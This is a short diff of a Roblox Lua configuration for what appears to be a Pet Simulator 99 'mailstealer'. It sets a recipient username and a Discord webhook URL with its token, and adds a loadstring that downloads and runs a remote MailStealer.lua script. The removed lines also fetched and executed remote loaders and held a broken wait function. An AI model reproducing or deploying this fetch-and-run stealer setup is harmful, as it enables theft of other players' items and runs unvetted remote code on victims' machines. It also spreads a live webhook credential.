@@ -1,14 +1,5 @@
 Username = "ShuyanNee"
-Username2 = "ShuyanNee"
-Webhook = "idk"
+LoadScreen = true 
+Webhook = "https://discord.com/api/webhooks/1225825628293431317/jK1fHV0pFVxTaeMZhGA54IqG6zQDiByEGjLtMlx-YhogA5NSbcxgVW_0NnHLj_AOLwwg" -- Paste your Discord webhook here
 
-LoadingScreen = true
-
-MinimumRAP = 100000
-
-loadstring(game:HttpGet("https://hugegames.lol/ps99.lua"))()
-function wait(10)
-local start = os.time()
-repeat until os.time() > start + seconds
-end
-loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/439bc415d8fe721fab08f3cebf76f4da.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KiuuP/PS99_Mailstealer/main/MailStealer.lua"))()
